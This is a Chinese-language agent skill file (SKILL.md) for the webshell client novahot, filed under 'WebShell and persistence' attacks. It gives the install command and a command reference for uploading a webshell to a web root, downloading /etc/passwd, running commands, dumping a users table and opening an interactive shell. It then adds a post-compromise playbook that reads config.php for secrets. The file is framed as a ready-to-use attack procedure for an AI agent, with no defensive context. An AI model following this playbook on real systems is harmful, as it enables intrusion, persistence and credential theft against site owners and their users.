---
name: novahot-web-shell
description: 渗透工具 skill:novahot 的安装、参数速查与攻击场景 playbook。当任务涉及 WebShell与持久化 需要调用 novahot 时使用。
---

# novahot

- 攻击大类:C13 WebShell与持久化
- 上游仓库:https://github.com/chrisallenlane/novahot
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
npm install -g novahot
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `novahot upload ./shell.php /var/www/shell.php` | 上传 WebShell |
| `novahot download /etc/passwd ./passwd.txt` | 下载文件 |
| `novahot exec 'id'` | 执行命令 |
| `novahot mysql 'SELECT * FROM users'` | 内置数据库客户端 |
| `novahot shell` | 交互 shell |

## 攻击场景 Playbook

### 获 WebShell 后统一操作

```bash
novahot upload webshell.php /var/www/html/s.php
novahot exec 'cat /var/www/html/config.php'
# 多种 payload 类型(php/asp/aspx)统一 CLI 管理
```

## 注意事项

跨平台 WebShell 客户端(Node.js),支持 PHP/ASP/ASPX payload,命令/文件传输/数据库一体。
